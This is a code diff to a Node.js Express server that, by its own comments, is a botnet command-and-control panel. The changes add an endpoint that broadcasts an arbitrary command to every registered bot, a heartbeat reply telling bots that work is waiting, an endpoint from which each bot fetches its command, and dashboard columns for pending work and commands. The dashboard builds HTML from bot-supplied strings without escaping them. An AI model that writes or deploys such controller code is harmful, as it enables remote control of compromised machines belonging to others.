@@ -39,8 +39,11 @@ function handleNew(newBot) {
 app.post('/heartbeat', function(req, res) {
 	//Look through known bots and update their status based on IP
 	var foundInBots = false;
+	var actualBot; //This will be the bot that just heartbeated
+	//[section] Updates bots we already know about with their current status
 	for (var i = 0; i < bots.length; i++) {
 		if (bots[i].ip == req.ip) {
+			actualBot = bots[i];
 			console.warn("Received heartbeat from  " + req.ip);
 			bots[i].status = req.body.status;
 			if (!bots[i].online) {
@@ -51,19 +54,57 @@ app.post('/heartbeat', function(req, res) {
 			bots[i].lastHeartbeat = Date().toLocaleString();
 		}
 	}
+	//[/section]
+	//[section] If we don't know about that bot, we add it to our list
 	if (!foundInBots) {
 		var bot = {
 			ip: req.ip, //This is based off of what WE see when the bot contacts us
 			online: true, //We can assume this
 			status: req.body.status, //This is part of the post that they send us
-			lastHeartbeat: Date().toLocaleString()
+			lastHeartbeat: Date().toLocaleString(),
+			outstandingWork: false,
+			command: ""
 		};
 		handleNew(bot);
-		res.send("Added");
+		res.send("added"); 
 		console.log("New bot added from " + req.ip);
+	//[/section]
+	//This section handles the reply to any bots that we know about, and just checked in with a heartbeat
 	} else {
-		res.send("pong");
+		//Let's tell the bot if they have work available
+		if (actualBot.outstandingWork) {
+			res.send("workavailable");
+			//Since the bot has been told it has work available, we can then remove that so it doesn't get redirected on its next heartbeat
+			actualBot.outstandingWork = false;
+		} else {
+		//Or not
+			res.send("pong");
+		}
 		
+	}
+});
+
+//We POST here to send new commands to the botnet
+app.post('/command', function(req, res) {
+	//Let's make sure nobody else can post here except us
+	if (req.ip != "::ffff:127.0.0.1") {
+		res.status(403).send('Forbidden');
+	} else {
+		console.log("New command received: " + req.body.command);
+		console.log("Broadcasting to bots");
+		for (var i = 0; i < bots.length; i++) {
+			bots[i].outstandingWork = true;
+			bots[i].command = req.body.command;
+		}
+		res.send("Command broadcast");
+	}
+});
+//We GET here to grab the latest work for our IP
+app.get('/command', function(req, res) {
+	for (var i = 0; i < bots.length; i++) {
+		if (req.ip == bots[i].ip) {
+			res.send(bots[i].command);
+		}
 	}
 });
 
@@ -92,7 +133,7 @@ app.listen(3000, function () {
 function genTable() {
 	var tableHTML = headerTable;
 	for (var i = 0; i < bots.length; i++) {
-		tableHTML += tableContentGen(bots[i].ip, bots[i].online, bots[i].status, bots[i].lastHeartbeat);
+		tableHTML += tableContentGen(bots[i].ip, bots[i].online, bots[i].status, bots[i].lastHeartbeat, bots[i].outstandingWork, bots[i].command);
 	}
 	tableHTML += footerTable;
 	return tableHTML;
@@ -105,16 +146,20 @@ var headerTable = `
     <th>Online</th>
     <th>Last Status</th>
     <th>Last Heartbeat</th>
+    <th>Work Available</th>
+    <th>Last Command</th>
   </tr>
 `;
 
-function tableContentGen(ip, online, status, lhb) {
+function tableContentGen(ip, online, status, lhb, work, cmd) {
 	return ` 
 	<tr>
     <td>${ip}</td>
     <td>${online}</td>
     <td>${status}</td>
     <td>${lhb}</td>
+    <td>${work}</td>
+    <td>${cmd}</td>
   </tr>`
 }
 
